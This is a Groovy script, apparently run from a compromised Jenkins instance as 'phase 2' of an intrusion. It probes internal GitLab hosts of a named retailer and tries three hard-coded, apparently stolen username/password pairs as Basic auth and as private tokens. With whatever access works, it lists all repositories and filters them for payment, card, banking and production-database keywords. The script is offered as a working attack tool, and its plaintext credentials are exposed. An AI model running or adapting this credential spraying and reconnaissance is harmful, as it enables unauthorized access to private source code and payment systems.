// PHASE 2: GitLab con IP CORRECTA = 172.27.140.134
// /etc/hosts in Jenkins container: 172.27.140.134 gitlab.dev.claroshop.com
// Also: 172.27.141.5 gitlab.claroshop.tmx-internacional.net

def creds = [
    ["jenkins", "e6LBqIkOI\$PR1XX2oia"],
    ["jenkins_legacy", "JenkisLegasy25"],
    ["maria.policarpo", "FtMRl4fDXzIDY4Yj"],
]

def hosts = [
    "http://172.27.140.134",
    "http://172.27.140.134:8080",
    "http://gitlab.dev.claroshop.com",
    "http://172.27.141.5",
    "http://172.27.141.5:8080",
]

def workingBase = null
def workingAuth = null
def workingUser = null

println "=== STEP 1: FIND OPEN GITLAB PORT ==="
hosts.each { base ->
    try {
        def conn = new URL(base + "/api/v4/version").openConnection()
        conn.connectTimeout = 5000; conn.readTimeout = 6000
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        def body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?.take(200)?:""
        println "  ${base} -> [${code}] ${body.take(150)}"
        if (code == 200 || code == 401) {
            workingBase = base
        }
    } catch(e) { println "  ${base} -> ERR: ${e.message?.take(80)}" }
}

println "\n=== STEP 2: TRY AUTH ON ${workingBase ?: 'first available'} ==="
if (!workingBase) workingBase = "http://172.27.140.134"

creds.each { c ->
    if (workingAuth) return
    try {
        def enc = (c[0]+":"+c[1]).bytes.encodeBase64().toString()
        def conn = new URL(workingBase + "/api/v4/user").openConnection()
        conn.connectTimeout = 6000; conn.readTimeout = 8000
        conn.setRequestProperty("Authorization", "Basic " + enc)
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        def body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?.take(300)?:""
        println "  AUTH ${c[0]}: [${code}] ${body.take(200)}"
        if (code == 200) {
            workingAuth = enc
            workingUser = c[0]
        }
    } catch(e) { println "  AUTH ${c[0]} ERR: ${e.message?.take(80)}" }
}

// Also try private token auth (if creds are tokens not passwords)
if (!workingAuth) {
    println "  Trying PRIVATE-TOKEN header..."
    ["e6LBqIkOI\$PR1XX2oia", "JenkisLegasy25", "FtMRl4fDXzIDY4Yj"].each { tok ->
        if (workingAuth) return
        try {
            def conn = new URL(workingBase + "/api/v4/user").openConnection()
            conn.connectTimeout = 6000; conn.readTimeout = 8000
            conn.setRequestProperty("PRIVATE-TOKEN", tok)
            conn.setInstanceFollowRedirects(true)
            def code = conn.responseCode
            def body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?.take(200)?:""
            println "  TOKEN: [${code}] ${body.take(150)}"
            if (code == 200) { workingAuth = "token:" + tok; workingUser = "token" }
        } catch(e) { println "  TOKEN ERR: ${e.message?.take(60)}" }
    }
}

println "\n=== STEP 3: LIST ALL PROJECTS ==="
if (!workingAuth) {
    println "NO AUTH - trying public list..."
    try {
        def conn = new URL(workingBase + "/api/v4/projects?per_page=100").openConnection()
        conn.connectTimeout = 8000; conn.readTimeout = 20000
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        def body = (code < 400 ? conn.inputStream : conn.errorStream)?.text?:""
        println "[${code}] ${body.take(500)}"
    } catch(e) { println "ERR: ${e.message?.take(80)}" }
    return
}

// Paginate all projects
def allProjects = []
(1..30).each { page ->
    try {
        def url = workingBase + "/api/v4/projects?per_page=100&page=${page}"
        def conn = new URL(url).openConnection()
        conn.connectTimeout = 10000; conn.readTimeout = 20000
        
        if (workingAuth.startsWith("token:")) {
            conn.setRequestProperty("PRIVATE-TOKEN", workingAuth.replace("token:",""))
        } else {
            conn.setRequestProperty("Authorization", "Basic " + workingAuth)
        }
        conn.setInstanceFollowRedirects(true)
        def code = conn.responseCode
        if (code != 200) return
        def body = conn.inputStream.text
        if (body.trim() == "[]") return
        
        // Extract projects
        def count = 0
        def pattern = ~/"id":(\d+),"description"[^}]*?"name":"([^"]+)","name_with_namespace":"([^"]+)","path":"([^"]+)","path_with_namespace":"([^"]+)"/
        body.findAll(pattern).each { match ->
            def m = (match =~ pattern)[0]
            allProjects << [id: m[1], name: m[2], ns: m[3], path: m[4], fullpath: m[5]]
            count++
        }
        if (count == 0) return
    } catch(e) { }
}

println "TOTAL PROJECTS: ${allProjects.size()}"
allProjects.sort { it.fullpath }.each { p ->
    println "  [${p.id}] ${p.fullpath}"
}

// Keywords for filtering
def keywords = ["sears", "t1pago", "t1_pago", "payment", "axii", "caja", "tienda", "monedero", "pago", "tarjeta", "banco", "card", "apifin", "claropay", "spei", "dbase", "proddb", "prod"]
def relevant = allProjects.findAll { p ->
    keywords.any { k -> p.fullpath.toLowerCase().contains(k) }
}

println "\n=== RELEVANT REPOS (${relevant.size()}) ==="
relevant.each { p -> println "  [${p.id}] ${p.fullpath}" }
println "\n=== DONE PHASE 2 ==="
